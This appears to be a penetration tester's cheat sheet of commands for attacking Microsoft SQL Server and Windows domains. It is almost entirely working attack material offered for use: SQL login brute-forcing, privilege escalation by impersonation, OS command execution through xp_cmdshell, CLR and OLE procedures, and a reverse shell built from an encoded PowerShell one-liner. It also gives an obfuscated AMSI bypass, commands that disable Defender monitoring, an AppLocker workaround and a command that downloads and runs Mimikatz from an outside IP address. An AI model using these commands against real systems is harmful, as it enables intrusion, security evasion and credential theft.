### SQL Brute Force Attacks
# ** Must have a good wordlist before bruteforcing
# ** Most organizations don't have good monitoring on non-production systems
# You can use Invoke-BruteForce from Nishang. Need to know the users in the database first
# Enumerate users to see what is in there
Get-SQLFuzzServerLogin -Instance UFC-SQLDev -Verbose
Get-SQLFuzzServerLogin -Instance UFC-SQLDev -Verbose | select PrincipleName | out-file userlist.txt
# If you don't have a user list, you can at least try 'sa' user!
(Get-SQLInstanceDomain).Computername | Invoke-BruteForce -UserList users.txt -PasswordList passwords.txt -Service SQL -Verbose
# You can use this from powerViewSQL
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Username sa -Password password -Verbose
# you should try to see what you can access with different users
runas /noprofile /netonly /user:<domain\username> powershell.exe
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded 


## After getting access, enumerate more inside SQL
# SQL Commands to enumerate info
Select @@version
Select SUSER_NAME(), SELECT SYSTEM_USER
Select IS_SRVROLEMEMBER('sysadmin')
Select name from master..sysdatabases
select * from sys.server_principals where type_desc != 'SERVER_ROLE'
select * from sys.database_principals where type_desc != 'DATABASE_ROLE'
select * from sys.server_principals where IS_SRVROLEMEMBER('sysadmin', name) = 1
select * from fn_my_permissions(NULL, 'SERVER')
select * from fn_my_permissions(NULL, 'DATABASE')
select * from sys.user_token
select * from sys.login_token


### SQL Privilege Escalation
## use Execute as to impersonate
Execute as login = 'dbadmin'
# this will return a 1 if it has admin privs
Select is_srvRolemember('sysadmin'); 
# if you have a user/password to start with
Invoke-SQLAuditPrivImpersonateLogin -Username sqluser -Password slq@123 -Instance UFC-SQLDev
Invoke-SQLAuditPrivImpersonateLogin -Username sqluser -Password slq@123 -Instance UFC-SQLDev -Exploit
# the command above cannot chain together impersonations. Can only do it one at at time

## Abuse a trustworthy database (msdb is always set to true, but it cannot be attacked here!)
Select name as database_name, $USER_NAME(owner_sid) as database_owner, is_trustworthy_on as TRUSTWORTHY from sys.databases
# See which usernames you should use
select DP1.name as DatabaseRoleName, isnull(DP2.name, 'No members') as DatabaseUserName FROM sys.database_role_members as DRM Right outer join sys.database_principals as DP1 on DRM.role_principal_id = DP1.principal_id LEFT OUTER JOIN sys.database_principals as DP2 on DRM.member_principal_id = DP2.principal_id WHERE DP1.type = 'R' order by DP1.name;
# Same thing with PowerUpSQL
Invoke-SQLAuditPrivTrustworthy -Instance UFC-SQLDev -Verbose
# Exploit with EXECUTE AS commands
use trust_db; EXECUTE AS user = 'dbo'; select system_user; exec sp_addsrvrolemember 'usfun\pastudent149', 'sysadmin'

## OS Command Execution
# See https://www.slideshare.net/nullbind/beyond-xpcmdshell-owning-the-empire-through-sql-server
# xp_cmdshell -> uses synchronous control. required sysamdin privileges
# reinstall and enable
sp_addextendedproc 'xp_cmdshell', 'xplog70.dll'
EXEC sp_configure 'show advanced options', 1
# this command below does leave a log entry!
RECONFIGURE               
EXEC sp_configure 'xp_cmdshell', 1
RECONFIGURE
EXEC master..xp_cmdshell 'whoami'
# Now that you can execute, you can either continue to pass commands through the GEt-SQLQuery or shift
Invoke-SQLOSCmd -Username sa -Password Password1 -Instance UFC-SQLDev -Command whoami
Execute-Command-MSSQL -Computernmame UFC-SQLDev -Username sa -Password Password1

## Extended Stored Procedure
# Upload a dll and can be loaded with either UNC path or Webdav or other (major draw back here)
# The function MUST have the same name as the filename once it is on the system.
sp_addextendedproc 'xp_calc', 'C:\mydll\xp_calc.dll'
exec xp_calc
sp_dropextendedproc 'xp_calc'
# or use PowerUpSQL
Create-SQLFileXpDll -OutFile C:\fileserver\xp_calc.dll -Command "calc.exe" -ExportName xp_calc
Get-SQLQuery -Username sa -Password Password1 -Instance UFC-SQLDev -Query "EXEC xp_calc"
Get-SQLStoredProcedureXP -Instance UFC-SQLDev -Verbose  # Are there any stored ones already in there?

# Use could use CLR assemblies
# see https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration
# see https://blog.netspi.com/attacking-sql-server-clr-assemblies
# compile with .Net
csc.exe /target:library C:\filepath\cmd_exec.cs
# Then import after upload
use msdb
sp_configure 'show advanced options', 1
sp_configure 'clr enabled', 1
reconfigure   -- makes a log entry when doing this
CREATE ASSEMBLY my_assembly FROM '\\myip\fileserver\cmd_exec.dll' with permission_set = UNSAFE;
#  OR you could import the assembly by using PowerUpSQL
Create-SQLFileCLRDll -ProcedureName "runcmd" -OutFile runcmd -OutDir .
# that creates the sql statements for you!

# once done, you can remove it with
DROP ASSEMBLY runcmd

# Now drop a reverse shell
# Start with Invoke-PowerShellTcpOneline.ps1 and set the right parameters
. .\powercat.ps1
powercat -lvp 443 -t 1000
. .\Invoke-encode.ps1
Invoke-Encode -DataToEncode .\Invoke-PowerShellTcpOneLine.ps1 -outCommand
# Now initiate it using whatever approach you want
EXEC master..xp_cmdshell 'powershell -e <cutandpaste the encoded file contents>'
Invoke-SQLOSCmd -Computername UFC-SQLDev -Command 'powershell -e <cutandpaste the encoded file contents'

## OLE Automation Procedures
# Enable OLE Automation Stored Procedures
sp_configure 'show advanced options', 1
reconfigure
sp_configure 'ole automation procecures', 1
reconfigure
# now execute something
DECLARE @output INT
DECLARE @ProgramToRun varchar(255)
Set @ProgramToRun = 'Run("calc.exe")'
EXEC sp_oacreate 'wScript.Shell', @output out
EXEC sp_oamethod @output, @ProgramToRun
EXEC sp_oadestroy @output


### Getting around AMSI
# 
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE'  ) ) ;    (    GeT-VariaBle ("1q2u"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((   "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
# that only works for the session you are in
# other options for the AV are below
Invoke-Command -ScriptBlock{ Set-MpPreference -DisableIOAVProtection $true} -Session $sess
Invoke-Command -ScriptBlock{ Set-MpPreference -DisableRealtimeMonitoring $true} #-Session $sess
# Getting files around
iex (iwr http://192.168.49.150/Invoke-Mimikatz.ps1)
# check to see if it really got loaded in memory
help Invoke-Mimikatz
## Applocker go-around
# See what is there
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
# if there are some default rules to specific locations, you can just use those locations by copying the script to that directory
# If you are in constrained langauge mode, you have to append the function call to the end of the script

# Everytime you find a hash, you have to then use Invoke-Mimikatz and run your enumeration AGAIN with the new perms
Find-LocalAdminAccess -Verbose
Invoke-CheckAdminAccess -Verbose